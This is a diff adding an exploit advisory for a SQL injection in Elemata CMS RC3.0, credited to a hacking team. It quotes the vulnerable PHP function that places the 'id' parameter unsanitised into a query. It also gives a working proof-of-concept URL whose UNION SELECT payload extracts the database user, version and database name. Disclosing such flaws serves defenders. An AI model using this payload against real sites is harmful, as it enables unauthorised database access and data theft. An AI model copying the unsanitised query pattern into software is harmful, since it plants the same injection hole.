@@ -1,0 +1,55 @@
+# Exploit Title   : Elemata CMS RC3.0 SQL Injection
+# Date            : 23 June 2013
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://www.elemata.com/
+# Software Link   : http://jaist.dl.sourceforge.net/project/elematacms/Elemata%203.x/ElemataRC3.0.zip
+# Version         : RC 3.0
+# Tested on       : Window and Linux
+   
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /       
+  / XXXXXX /
+ (________(         
+  `------'
+   
+##############################
+VULNERABILITY: SQL Injection
+##############################
+   
+/functions/global.php (LINE: 24-30)
+   
+-----------------------------------------------------------------------------  
+function e_meta($id)
+{
+   include ("Connections/default.php");
+   mysql_select_db($database_default, $default);
+   $query_meta = "SELECT * FROM posts WHERE id = '$id'";
+   $meta = mysql_query($query_meta, $default) or die(mysql_error());
+   $row_meta = mysql_fetch_assoc($meta);
+-----------------------------------------------------------------------------      
+   
+#####################################################
+DESCRIPTION FOR SQL INJECTION
+#####################################################
+   
+An attacker might execute arbitrary SQL commands on the database server with this vulnerability.
+User tainted data is used when creating the database query that will be executed on the database management system (DBMS).
+An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system
+depending on the query, DBMS and configuration.
+  
+POC:
+  
+http://http://localhost/elemata/?id=-1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,concat%28user%28%29,0x3a3a,version%28%29,0x3a3a,database%28%29%29,NULL,NULL,NULL,NULL--+
+
+Then View Source !!   
+   
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+################################################################################################################
